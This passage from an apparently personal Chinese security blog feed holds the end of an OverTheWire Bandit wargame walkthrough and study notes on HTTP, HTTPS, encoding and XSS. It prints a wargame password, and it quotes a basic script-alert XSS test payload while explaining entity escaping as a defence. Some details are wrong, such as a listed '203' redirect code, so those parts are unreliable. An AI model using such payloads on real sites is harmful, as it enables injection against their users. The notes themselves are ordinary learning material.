<p>可以知道，又是私钥登陆，与ssh -i有关</p>
<p>存放该私钥。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120130800.png" alt="image-20230515120130800"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120139520.png" alt="image-20230515120139520"></p>
<p><code>ssh -i /tmp/my111/key bandit17@localhost -p2220</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120357068.png" alt="image-20230515120357068"></p>
<p>要设定权限，700，即只有拥有者可以读写。</p>
<p><code>chmod 700 /tmp/my111/key</code></p>
<p><img src="/../../../Typora/img111/image-20230515120619059.png" alt="image-20230515120619059"></p>
<p>成功登入。</p>
<h2 id="level-17-gt-18"><a href="#level-17-gt-18" class="headerlink" title="level 17-&gt;18"></a>level 17-&gt;18</h2><p>在主目录有两文件<strong>passwords.old and passwords.new</strong>. </p>
<p>下一级的密码在 <strong>passwords.new</strong>里，并且这个old和new只有一行改动了的。</p>
<p>​		注意：当登入bandit18时看到”Byebye!”，这和bandit19有关。</p>
<p>diff命令，比较文件不同。</p>
<ul>
<li><p>“|”表示前后2个文件内容有不同</p>
</li>
<li><p>“&lt;”表示后面文件比前面文件少了1行内容</p>
</li>
<li><p>“&gt;”表示后面文件比前面文件多了1行内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130247402.png" alt="image-20230515130247402"></p>
</li>
</ul>
<p>hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg</p>
<p>exit -&gt;r</p>
<p>登入bandit18，输入密码出现：<img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130727349.png" alt="image-20230515130727349"></p>
<h2 id="level-18-gt-19"><a href="#level-18-gt-19" class="headerlink" title="level 18-&gt;19"></a>level 18-&gt;19</h2><p>下一级密码在主目录的readme中，但是嘞，有人修改了.bashrc，使得在使用SSH登录时注销。</p>
<p>考察点：ssh登陆后可以跟命令执行</p>
<p>所以在bandit17时采用远程登录。</p>
<p><code>ssh bandit18@localhost -p2220</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515133004926.png" alt="image-20230515133004926"></p>
<p>上图中，rm和chmod也是不允许的操作，查找其他博主的wp，在后面加了“cat  readme”但没效果</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515145336983-1684133695637-1.png"></p>
<p>止步于此，没权限，不搞了。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ssh</tag>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title>http与xss</title>
    <url>/2023/06/10/http%E4%B8%8Exss/</url>
    <content><![CDATA[<h1 id="一、web安全基础"><a href="#一、web安全基础" class="headerlink" title="一、web安全基础"></a>一、web安全基础</h1><h2 id="1-web应用"><a href="#1-web应用" class="headerlink" title="1.web应用"></a>1.web应用</h2><h3 id="1-HTTP请求与响应"><a href="#1-HTTP请求与响应" class="headerlink" title="1.HTTP请求与响应"></a>1.HTTP请求与响应</h3><p>（PC）访问网址-&gt;发起请求（HTTP请求包头结构）-&gt;（服务器）接收并回应请求-&gt;HTTP响应-&gt;（HTTP响应包头结构）-&gt;得到页面</p>
<p>请求包与响应包不陌生了，bp抓一下就有。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616203032474.png" alt="信息查询功能流程"></p>
<p>1）Web应用不一定为用户可见页面，比如各类API接口，其原理是一个Web页面，并对用户请求的内容进行处理。</p>
<p>2）Web应用不一定要依托浏览器才能使用，例如，爬虫脚本的数据获取部分，只要能构造HTTP Request包即可开展对Web应用数据的获取。</p>
<p>3）并不一定需要标准的Web中间件，直接利用编程语言编写对应处理规则也可实现对用户请求的处理，但处理的过程就是中间件本来该执行的工作。</p>
<h3 id="2-web应用环境"><a href="#2-web应用环境" class="headerlink" title="2.web应用环境"></a>2.web应用环境</h3><p>Web应用需要一台服务器提供基础资源，可运行操作系统，并配合中间件来为用户提供服务。如果站点功能较为复杂，那么还需要用数据库提供基础的数据存储支持，用文件服务器进行备份，用SAN系统提供高性能的文件存储等。在这个过程中，任何一个环节出现问题，都可能导致Web安全问题出现。</p>
<h3 id="3-交互"><a href="#3-交互" class="headerlink" title="3.交互"></a>3.交互</h3><p>HTTP协议作为Web应用的基础协议，其特点就是用户请求–服务器响应。在这个过程中，服务器一直处于被动响应状态，无法主动获取用户的信息。再看一下HTML结构，服务器在完成用户响应后，当前的HTML页面会被发送到用户端的浏览器，这也就决定了客户端拥有HTML的全部结构及内容。基于这种交换环境，在客户端可篡改任何请求参数，服务器必须对请求内容进行响应。这也就决定了Web最核心的问题，用户端的所有行为均不可信。</p>
<h2 id="2-Http协议"><a href="#2-Http协议" class="headerlink" title="2.Http协议"></a>2.Http协议</h2><h3 id="1-定义与特点"><a href="#1-定义与特点" class="headerlink" title="1.定义与特点"></a>1.定义与特点</h3><p>HTTP是一个应用层的面向对象的协议</p>
<blockquote>
<p>其特点有三：</p>
<ol>
<li>无状态，客户端发起请求-&gt;服务端响应-&gt;发出新请求，每次请求均为独立行为，体现了HTTP无状态特点</li>
<li>支持B&#x2F;S模式，有浏览器即可工作，用户可上手易于操作</li>
<li>灵活性好，数据传输、视频播放、交互</li>
</ol>
</blockquote>
<h3 id="2-HTTP请求内容"><a href="#2-HTTP请求内容" class="headerlink" title="2.HTTP请求内容"></a>2.HTTP请求内容</h3><p>HTTP请求由三部分组成，分别是请求行、消息报头、请求正文。</p>
<blockquote>
<p>GET &#x2F;ad&#x2F;json&#x2F;integrate&#x2F;list?positions&#x3D;932 HTTP&#x2F;1.1<br><strong>Host</strong>: kunpeng.csdn.net<br>Connection: close<br>sec-ch-ua: “Chromium”;v&#x3D;”112”, “Google Chrome”;v&#x3D;”112”, “Not:A-Brand”;v&#x3D;”99”<br><strong>Accept:</strong> application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01<br><strong>Content-Type</strong>: application&#x2F;x-www-form-urlencoded; charset&#x3D;utf-8<br>sec-ch-ua-mobile: ?0<br><strong>User-Agent</strong>: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;112.0.0.0 Safari&#x2F;537.36<br>sec-ch-ua-platform: “Windows”<br><strong>Origin</strong>: <a href="https://www.csdn.net/">https://www.csdn.net</a><br>Sec-Fetch-Site: same-site<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br><strong>Referer</strong>: <a href="https://www.csdn.net/">https://www.csdn.net/</a><br><strong>Accept-Encoding</strong>: gzip, deflate<br><strong>Accept-Language</strong>: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Cookie: uuid_tt_dd&#x3D;10_37087154240-1640528249…..</p>
</blockquote>
<p><strong>1.请求行</strong></p>
<p>标准的请求行格式为：</p>
<blockquote>
<p>请求方法 请求URI 协议版本 回车换行</p>
</blockquote>
<p>嗯，就bp抓包时的第一行</p>
<p><strong>请求方法统计一下</strong></p>
<blockquote>
<p>·GET　请求获取Request-URI所标识的资源。</p>
<p>·POST　在Request-URI所标识的资源后附加新的数据。</p>
<p>·HEAD　请求获取由Request-URI所标识的资源的响应消息报头。</p>
<p>·PUT　请求服务器存储一个资源，并用Request-URI作为其标识。</p>
<p>·DELETE　请求服务器删除Request-URI所标识的资源。</p>
<p>·TRACE　请求服务器回送收到的请求信息，主要用于测试或诊断。</p>
<p>·CONNECT　保留，将来使用。</p>
<p>·OPTIONS　请求查询服务器的性能，或者查询与资源相关的选项和需求。</p>
<p>在实际应用中，考虑到安全因素，主要使用GET和POST两种方式开展请求。例如，早期ASP系统中存在大量IIS PUT漏洞，导致攻击者可直接利用PUT工具上传木马以获得Webshell。因此，从安全及业务开展统一的角度，其余方式目前基本都不再使用。</p>
<p>GET和POST在使用中的主要区别为：</p>
<p>·GET方法　通过在浏览器的地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，对应的请求行示例为：GET&#x2F;form.html HTTP&#x2F;1.1（CRLF）。</p>
<p>·POST方法　要求被请求服务器接收附在请求后面的数据，常用于提交表单。</p>
</blockquote>
<p><strong>2.消息报头</strong></p>
<blockquote>
<p>·Host（必须存在）：Host主要用于指定被请求资源的Internet主机和端口号，即标识请求目标。其来源为当前访问的URL。缺省端口号为80，若指定了端口号（以8000为例）进行防卫，则变成Host： kunpeng.csdn.net:8000。</p>
<p>·Content-Length：标识当前请求包中的内容长度。</p>
<p>·Origin：用来标识本次请求的发起源，只适用于POST方式。</p>
<p>·Referer：用来标识当前请求的发起页面。</p>
<p>·Accept：Accept用于指定客户端接收哪些类型的信息。上例中表明允许后续类型在客户端实现。</p>
<p>·Accept-Encoding：告知服务器端当前客户端可接受的内容编码。</p>
<p>·Accept-Language：告知服务器端支持的语言类型。</p>
<p>·User-Agent：User-Agent通常简称为UA，其中包含当前用户的操作系统、浏览器的基本信息，用于告知Web服务器当前访问者的情况。此报头域不是必需存在的。但如果客户端不使用User-Agent请求报头域，那么服务器端就无法得知客户端的基本信息。目前UA也经常被Web服务器用于统计当前用户状态及行为。</p>
</blockquote>
<p><strong>3.请求正文</strong></p>
<blockquote>
<p>Sec-Fetch-Dest: document<br>Referer: <a href="http://localhost:81/7/1.html">http://localhost:81/7/1.html</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Connection: close</p>
<p><strong>username&#x3D;123&amp;pwd&#x3D;546&amp;%26%2365533%3B%26%2365533%3B%E4%BA%26%2365533%3B&#x3D;%C4%F3%B8%F2</strong></p>
<p>黑粗体部分为请求正文内容</p>
</blockquote>
<p>注意，get请求没有这一项，因为在url就包含了</p>
<p>当然了，防止攻击的话，post的请求参数不要这么大众化。</p>
<h3 id="3-HTTP响应内容"><a href="#3-HTTP响应内容" class="headerlink" title="3.HTTP响应内容"></a>3.HTTP响应内容</h3><p>响应行、响应消息报头、响应正文</p>
<p>重点说下常见的响应消息报头：</p>
<blockquote>
<p>·Server　Server响应报头域包含服务器用来处理请求的软件信息。参考图1-6，其中定义了Server：Apache，用来告知用户端提供本次响应的服务器端采用的中间件是Apache。可以看到，在响应包中Server信息与请求包中User-Agent信息的作用非常类似，都是将自身的版本告知对方。</p>
<p>·X-Powered-By　用来标识实现当前Web站点所采用的语言及版本号。</p>
<p>·Set-cookie　根据响应包生成Cookie，并提供给客户端。</p>
<p>·Content-Length　与请求包中的用法相同，用以标识当前响应包中的内容长度。</p>
</blockquote>
<p>其响应正文内容呢，一般携带当前页面源码，在安全方面无需关注。</p>
<p>常见状态代码及状态描述：</p>
<blockquote>
<p>·200：OK，客户端请求成功。</p>
<p>·301：Permanently Moved，页面重定向。</p>
<p>·203：Temporarily Moved，页面临时重定向。</p>
<p>·400：Bad Request，客户端请求有语法错误，不能被服务器所理解。</p>
<p>·401：Unauthorized，请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用。</p>
<p>·403：Forbidden，服务器收到请求，但是拒绝提供服务。</p>
<p>·404：Not Found，请求资源不存在，或者请求无法实现。</p>
<p>·500：Internal Server Error，服务器发生不可预期的错误。</p>
<p>·503：Server Unavailable，服务器当前不能处理客户端的请求，一段时间后可能恢复正常。</p>
</blockquote>
<h3 id="4-URL"><a href="#4-URL" class="headerlink" title="4.URL"></a>4.URL</h3><p>协议+IP+端口(80省略呗)+路径+参数</p>
<blockquote>
<p><a href="https://www.neat-reader.cn/webapp#/epubreader?bookguid=682">https://www.neat-reader.cn/webapp#/epubreader?bookguid=682</a></p>
</blockquote>
<h2 id="3-HTTPS协议"><a href="#3-HTTPS协议" class="headerlink" title="3.HTTPS协议"></a>3.HTTPS协议</h2><p>HTTP的话，在登录页面上提交账户密码，用wireshark抓取该行为，可以清晰地看到用户当前的行为，包括用户的登录情况、用户名和密码、访问地址等。</p>
<p>所以引出HTTPS</p>
<h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>HTTPS并不是一个独立的协议，而是工作在SSL协议上的HTTP协议。SSL（Secure Sockets Layer，安全套接层）是一种为网络通信提供安全及数据完整性的安全协议。当然后续有TLS了，算是对SSL的拓展。</p>
<p>在HTTPS传输过程中有两个核心的问题将直接影响用户的数据安全：</p>
<p>1）如何建立安全的传输通道：加密方式</p>
<p>2）如何确认双方的身份：CA认证中心的权威</p>
<h3 id="2-HTTPS单向认证"><a href="#2-HTTPS单向认证" class="headerlink" title="2.HTTPS单向认证"></a>2.HTTPS单向认证</h3><blockquote>
<p>1）客户端向服务器发起请求，其中包含各种SSL参数，并从服务器端拿到证书。</p>
<p>2）客户端将从服务器端获得的证书提交至CA，CA验证该证书的合法性并告知客户端，客户端根据CA验证结果来确认目标站点的真实性。</p>
<p>3）从服务器端的证书中取出公钥，利用公钥对客户端产生的密钥加密（对称密钥），并利用公钥将加密后的密钥发送到服务器端。</p>
<p>4）服务器端用其私钥解密出数据，即得到客户端发送来的对称密钥，之后均利用这个对称密钥对传输文件进行加密&#x2F;解密。</p>
</blockquote>
<p>单向认证的特点在于只有客户端对服务器端进行了身份验证，而服务器只是对提交过来的加密密钥进行识别并处理，而不对客户端的合法性进行验证。这就造成了遭受SSL剥离攻击的隐患。</p>
<h4 id="SSL剥离攻击"><a href="#SSL剥离攻击" class="headerlink" title="SSL剥离攻击"></a>SSL剥离攻击</h4><p>SSL剥离攻击是针对HTTPS单向认证环境的攻击手段。例如，SSL Strip工具的原理就是劫持用户的请求，并模拟用户来与目标站点建立HTTPS连接。成功连接后利用已建立连接的对称密钥解密服务器发送过来的HTTPS，将其中的HTTP再发送给客户端</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616221327435.png" alt="SSL剥离攻击流程"></p>
<p>故HTTPS重点是解决传输过程中链路被劫持的风险，针对Web系统的安全防护效果有限。</p>
<h3 id="3-HTTPS双向认证"><a href="#3-HTTPS双向认证" class="headerlink" title="3.HTTPS双向认证"></a>3.HTTPS双向认证</h3><blockquote>
<p>1）客户端向服务器发起请求，其中包含各种SSL参数，并从服务器端拿到证书。</p>
<p>2）客户端将从服务器端获得的证书提交至CA，CA验证该证书的合法性并告知客户端，客户端根据CA验证结果来确认目标站点的真实性。在这里新增了两个步骤：</p>
<p>①服务器端要求客户端发送证书并验证，并接受用户的公钥。</p>
<p>②双方利用对方公钥加密来协商可支持的传输类型及密码方案。</p>
<p>3）客户端从服务器端的证书中取出公钥，利用公钥对客户端产生的密钥加密（对称密钥），并利用公钥将加密后的密钥发送到服务器端。</p>
<p>4）服务器端用私钥解密出数据，即得到客户端发送来的对称密钥，之后所有内容均利用这个对称密钥对传输文件进行加密&#x2F;解密。</p>
</blockquote>
<p>该认证方式增加了服务器对客户端的合法性校验，这样可有效避免SSL剥离攻击。但由于会要求密钥生成(安装密钥生成插件)，需要让用户有额外操作，不适用于全部场景。</p>
<h3 id="4-HTTPS特点"><a href="#4-HTTPS特点" class="headerlink" title="4.HTTPS特点"></a>4.HTTPS特点</h3><p>·HTTPS并没有改变HTTP协议本身的特性，只是在传输过程中利用SSL&#x2F;TLS技术进行加密，保障传输过程中的安全。</p>
<p>·HTTPS技术可有效保障用户信息不被泄露，避免上网行为设备、代理类设备对用户当前行为的获取，并且可有效避免来自运营商层面的TCP劫持。</p>
<p>·HTTPS主要防护传输过程中的安全，如果在用户端利用Burpsuite，则依然可以通过代理技术实现对Web访问的劫持，因此并不会有效提升服务器的安全性。</p>
<p>HTTPS重点解决的是<strong>传输过程</strong>中的安全问题，可用来保障客户端的传输数据安全，并不会直接提升Web站点的安全性。Web安全的问题仍要从功能角度出发，找到问题根源，方可有效解决。</p>
<h2 id="4-编码加密"><a href="#4-编码加密" class="headerlink" title="4.编码加密"></a>4.编码加密</h2><p><strong>针对字符的编码</strong></p>
<blockquote>
<p>1.ASCII编码</p>
<p>2.DBCS（Double Byte Charecter Set，双字节字符集）:</p>
<p>GB2312、GBK和GB18030等中文编码</p>
</blockquote>
<p><strong>传输过程的编码</strong></p>
<p>一般在HTML中，利用“&#x2F;”“？”“&amp;”等符号实现针对特定字符的内容定义。如果url的参数中也有这些字符，需要编码避免产生影响</p>
<h3 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1.URL编码"></a>1.URL编码</h3><blockquote>
<p>URL中只允许包含英文字母（a～z、A～Z）、数字（0～9）、4个特殊字符（-、_、.、~）以及所有保留字符。在实际Web应用中，所使用的字符不只在这个范围内，如用户输入参数中还带有单引号、百分号、中文等。因此，需要对URL中的非允许字符进行编码。</p>
<p>主体采用的是ASCII编码表，编码方式是用%（百分号）加上两位字符代表一个字节。</p>
<p>例如，单引号在ASCII中的<strong>十六进制</strong>编码为27，在URL编码中就是%27。</p>
<p>对于中文字符，会先确认当前页面所用的编码格式。如果当前页面使用UTF-8编码，则会先将中文字符转换成UTF-8编码，然后在每个字符的每一组编码前添加%，这样就完成URL编码。</p>
</blockquote>
<p>例如：</p>
<blockquote>
<p>·URL编码前</p>
<p><a href="http://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&passwd=ww121%25$">HTTP://172.29.152.23/loginPage.jsp?name=测试&amp;passwd=ww121%$</a></p>
<p>·URL编码后</p>
<p><a href="http://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&passwd=ww121%25$">HTTP://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&amp;passwd=ww121%25$</a></p>
</blockquote>
<p>假设当前页面为UTF-8编码。可以看到，URL编码里针对参数“ww121%$”中的“%”进行了编码，编码结果为“%25”。针对中文字符“测试”，URL编码(<strong>十六进制</strong>)为“%E6%B5%8B%E8%AF%95”。再查询“测试”字符的UTF-8编码，其十六进制编码就是“E6B58B E8AF95”。</p>
<h3 id="2-base64编码"><a href="#2-base64编码" class="headerlink" title="2.base64编码"></a>2.base64编码</h3><p>其原理是将3个8bit字节（3<em>8&#x3D;24）转化为4个6bit的字节（4</em>6&#x3D;24）。因此，Base64编码的特点是编码后的字节数<strong>是4的倍数</strong>，如果不足4bit则用等号（&#x3D;）等进行填充。<strong>它含有大小写字母及+、-、&#x3D;等符号</strong>。</p>
<p>例如：</p>
<blockquote>
<p>·编码前：base64编码</p>
<p>·编码后：YmFzZTY057yW56CB（十六位）</p>
<p>·编码前：base64编码1测试</p>
<p>·编码后：YmFzZTY057yW56CBMea1i+ivlQ&#x3D;&#x3D;</p>
</blockquote>
<h3 id="3-HTML字符实体"><a href="#3-HTML字符实体" class="headerlink" title="3.HTML字符实体"></a>3.HTML字符实体</h3><p>表示HTML中危险字符的方案，也是解决跨站脚本（XSS）攻击的有效手段。</p>
<p>HTML字符实体的特点是以&amp;开头，并以分号结尾。例如，“&lt;”的编码是“&amp;lt；”。</p>
<p>比如防范xss攻击时，</p>
<p>xss语句:<code>&lt;script&gt;alert（/xss/）&lt;/script&gt;</code></p>
<p>当用户提交的参数为xss语句时，经过HTML字符实体处理后，可得到“&amp;lt；script&amp;gt；alert（&#x2F;xss&#x2F;）&amp;lt；&#x2F;script&amp;gt；”。这样就解决了危险字符的显示问题。</p>
<h3 id="4-Web系统中的加密措施"><a href="#4-Web系统中的加密措施" class="headerlink" title="4.Web系统中的加密措施"></a>4.Web系统中的加密措施</h3><p>标准的加密方法是对用户提交的参数（如密码、特定内容等）进行加<strong>密后再传输</strong>，避免参数在传输过程中被劫持，导致用户数据丢失。当数据传输到Web服务器，将参数解密后处理。这个过程中存在两种情况。</p>
<h4 id="1-不需要服务器知道明文的内容"><a href="#1-不需要服务器知道明文的内容" class="headerlink" title="1.不需要服务器知道明文的内容"></a>1.不需要服务器知道明文的内容</h4><p>常见于用户的隐私信息，如用户密码。Web系统在存储用户密码时不会直接存储密码明文，而是预先设定加密算法，将用户的隐私信息加密后存储在数据库中。这样可在系统运维过程中避免管理人员直接观察并获取用户的密码信息。这种情况下，经常利用MD5&#x2F;SHA-1实现加密。</p>
<blockquote>
<p>MD5&#x2F;SHA-1是一种信息摘要算法，可将任意长度的明文内容转换成长度固定的密文，并且针对信息摘要的过程不可逆，但针对相同内容每次执行算法得到的密文完全相同。</p>
</blockquote>
<p>Web系统存储的内容就是经过MD5&#x2F;SHA-1转换后的密文。因此用户在客户端利用MD5&#x2F;SHA-1将转换后的密文传输到Web系统，Web系统再将<strong>用户密文与数据库中的密文进行比对</strong>即可。</p>
<p>当然，由于大量彩虹表（存储明文与密文的表）存在，可间接实现密码破解的效果。</p>
<p>此外，MD5&#x2F;SHA-1存在碰撞问题，即存在<strong>不同明文</strong>利用MD5或SHA-1计算之后得到的<strong>密文完全相同</strong>。</p>
<h4 id="2-需要服务器知道明文的内容"><a href="#2-需要服务器知道明文的内容" class="headerlink" title="2.需要服务器知道明文的内容"></a>2.需要服务器知道明文的内容</h4><p>客户端发起的请求中包含了大量需要服务器处理的内容，如订单信息、留言等。由于HTTP协议在传输过程中并不会对其中的内容加密，就会导致在传输过程中内容被抓包。</p>
<p>在传输过程中，加密的最大意义还是避免内容泄漏。</p>
<p>由于成本问题，https不是免费的哈，多数大型站点仍然会采用HTTP进行业务开展。</p>
<p>要在HTTP下保障传输安全，可利用对称加密措施进行实现，如AES方式等。但Web站点始终在用户浏览器上，那么相对应的加密算法也处于公开状态，所以<strong>算法越复杂越好</strong>，此外还要<strong>降低加密传参的数量</strong></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>http请求&#x2F;响应包结构、http与https、编码加密</p>
<h1 id="二、网络攻击"><a href="#二、网络攻击" class="headerlink" title="二、网络攻击"></a>二、网络攻击</h1><p>基础攻击是攻击者将攻击代码通过各种方式<strong>嵌入到现有Web系统中</strong>，造成Web系统在执行的时候，嵌入的攻击代码使Web系统原有功能结构发生改变，进而导致安全漏洞的出现。</p>
<h2 id="1-xss攻击"><a href="#1-xss攻击" class="headerlink" title="1.xss攻击"></a>1.xss攻击</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>XSS攻击（Cross Site Scripting，跨站脚本攻击），也叫做html&#x2F;js注入攻击。</p>
<blockquote>
<p>是指攻击者利用网站程序对用户输入过滤不足的缺陷，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p>
</blockquote>
<blockquote>
<p>XSS攻击主要影响的是用户端的安全，包含用户信息安全、权限安全等。并且多数XSS攻击都依赖于JavaScript脚本开展。</p>
</blockquote>
<h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><blockquote>
<p>将恶意脚本嵌入到当前网页中并执行的攻击方式</p>
</blockquote>
<h3 id="3-原因"><a href="#3-原因" class="headerlink" title="3.原因"></a>3.原因</h3><blockquote>
<p>主要原因是网站对于用户提交的数据过滤不严格，导致用户提交的数据可以修改当前页面或者插入了一段脚本。</p>
<p>网站一般具有用户输入参数功能，如网站留言板、评论处等。攻击者利用其用户身份在输入参数时附带了恶意脚本，在提交服务器之后，服务器没有对用户端传入的参数做任何安全过滤。之后服务器会根据业务流程，将恶意脚本存储在数据库中或直接回显给用户。在用户浏览含有恶意脚本的页面时，恶意脚本会在用户浏览器上成功执行。恶意脚本有很多种表现形式，如常见的弹窗、窃取用户Cookie、弹出广告等，这也是跨站攻击的直接效果。</p>
</blockquote>
<h3 id="4-涉及风险功能点"><a href="#4-涉及风险功能点" class="headerlink" title="4.涉及风险功能点"></a>4.涉及风险功能点</h3><h5 id="1-评论"><a href="#1-评论" class="headerlink" title="1.评论"></a>1.评论</h5><p>用户输入评论（评论处为攻击代码）→服务器接收到评论并存储（入库存储）→前台自动调用评论→任何人触发评论（直接看到攻击代码）→攻击成功</p>
<h5 id="2-私信"><a href="#2-私信" class="headerlink" title="2.私信"></a>2.私信</h5><p>用户发送私信（私信内夹带攻击代码）→服务器接收私信并存储（入库处理）→收信用户打开私信（展示攻击代码）→攻击成功。</p>
<p>XSS攻击的目标为<strong>打开已经嵌入XSS攻击代码网页的用户</strong>。用户的身份类型各不相同。根据身份特点，重点需要保障的用户信息为：</p>
<p>1）网站的管理员账号信息。</p>
<p>2）网站用户的账号信息及特权、金额等。</p>
<p>3）活跃账号的信息。</p>
<h3 id="5-XSS攻击分类"><a href="#5-XSS攻击分类" class="headerlink" title="5.XSS攻击分类"></a>5.XSS攻击分类</h3><p>根据攻击代码的存在地点及是否被服务器存储，并且根据XSS攻击存在的形式及产生的效果，可以将其分为以下三类。</p>
<blockquote>
<p>1）反射型跨站攻击：涉及浏览器—服务器交互。</p>
<p>将用户输入的数据通过URL的形式直接或未经过完善的安全过滤就在浏览器中进行输出，会导致输出的数据中存在可被浏览器执行的代码数据。</p>
<p>因为一般出现在URL中，因此黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使攻击成功实施。</p>
</blockquote>
<blockquote>
<p>2）存储型跨站攻击：涉及浏览器—服务器—数据库交互；</p>
<p>指Web应用程序将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示。</p>
<p>危害最广；实现偷取用户Cookie、进行内网探测、弹出广告等行为。</p>
<p>为常见的场景就是在博客或新闻发布系统中，黑客将包含恶意代码的数据信息直接写入文章或文章评论中，所有浏览文章或评论的用户就会被黑客在他们的客户端浏览器环境中执行插入的恶意代码。</p>
</blockquote>
<blockquote>
<p>3）DOM型跨站攻击：涉及浏览器—服务器交互。</p>
<p>其从效果上来说也算是反射型XSS。但是这种XSS实现方法比较特殊，是由<strong>JavaScript的DOM节点编程</strong>可以改变HTML代码这个特性而形成的XSS攻击。</p>
<p>基于DOM的XSS攻击往往需要针对具体的JavaScript DOM代码进行分析，并根据实际情况进行XSS攻击的利用。</p>
<p>实际上构造难度较大，比较少见。</p>
</blockquote>
<h3 id="6-攻击条件"><a href="#6-攻击条件" class="headerlink" title="6.攻击条件"></a>6.攻击条件</h3><p>反射型&#x2F;DOM型跨站攻击均可以理解为：</p>
<p>服务器接收到数据，并原样返回给用户，整个过程中Web应用并没有自身的存储过程（存入数据库）。这也就导致了攻击无法持久化，仅针对当次请求有效，也就无法直接攻击其他用户。</p>
<p>当然，这两类攻击也可利用钓鱼、垃圾邮件等手段产生攻击其他用户的效果。但是需在社会工程学的配合下执行。随着目前浏览器的各类过滤措施愈发严格，在实战过程中这类攻击的成功率、效果及危害程度均不高。但我们仍需关注这类风险。</p>
<h4 id="例子（存储型）"><a href="#例子（存储型）" class="headerlink" title="例子（存储型）"></a><strong>例子（存储型）</strong></h4><p>假设攻击者要想成功实施跨站脚本攻击，那么必须对业务流程进行了解。</p>
<p>流程如下：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616232445592.png" alt="业务流程"></p>
<p>业务流程关键点分析：</p>
<p>1）入库处理：攻击脚本需存储在数据库中，可供当前应用的使用者读取。</p>
<p>2）出库处理：由当前功能的使用者按照正常的业务流程从数据库中读取信息，这时攻击脚本即开始执行。</p>
<p>再对攻击进行分析，并结合XSS攻击的特性可知，XSS攻击成功必须要满足<strong>以下四个条件：</strong></p>
<blockquote>
<p>（1）入库处理</p>
<p>1）目标网页有攻击者可控的输入点。</p>
<p>2）输入信息可以在受害者的浏览器中显示。</p>
<p>3）输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过。</p>
<p>（2）出库处理</p>
<p>浏览器将输入解析为脚本，并具备执行该脚本的能力。</p>
</blockquote>
<p>实现一个XSS存储型跨站攻击，以上四点缺一不可。</p>
<p><strong>当然，防护的话，只需破坏上述任意一个条件。</strong></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>从防护角度，可以选择<strong>禁止攻击脚本存储</strong>在数据库，即在入库时做处理；或者对攻击脚本进行<strong>转义</strong>，避免出库时顺利执行。满足以上两种条件中的任何一个即可实现有效的防护。</p>
<h3 id="7-XSS漏洞发现"><a href="#7-XSS漏洞发现" class="headerlink" title="7.XSS漏洞发现"></a>7.XSS漏洞发现</h3><h4 id="1-基本测试流程"><a href="#1-基本测试流程" class="headerlink" title="1.基本测试流程"></a>1.基本测试流程</h4><p>对于存储型跨站漏洞。这主要取决于可能含有XSS漏洞的业务流程针对用户参数的<strong>过滤程度</strong>或者当前的<strong>防护手段</strong>。由于XSS漏洞最终<strong>仍需业务使用者浏览</strong>后方可触发执行，导致某些后台场景<strong>需要管理员触发</strong>后方可发现。因此，漏洞是否存在且可被利用，很多时候需要较长的时间才会得到结果。</p>
<p>常见的web漏洞扫描器可以扫出反射型xss漏洞，但仍有误报的可能，需要人工检验。存储型跨站攻击必须由用户触发才能被发现。如果用户一直不触发，则漏洞无法检查出来。</p>
<p>漏洞标准挖掘流程：</p>
<blockquote>
<p>1）漏洞挖掘，寻找输入点。</p>
<p>2）寻找输出点。</p>
<p>3）确定测试数据输出位置。</p>
<p>4）输入简单的跨站代码进行测试。</p>
</blockquote>
<h5 id="存储型xss测试"><a href="#存储型xss测试" class="headerlink" title="存储型xss测试"></a>存储型xss测试</h5><h6 id="1-寻找输入点"><a href="#1-寻找输入点" class="headerlink" title="1.寻找输入点"></a>1.寻找输入点</h6><p>攻击者通过提交参数，意图修改当前页面的HTML结构。XSS攻击成功时，提交的参数格式可在当前页面拼接成可执行的脚本。</p>
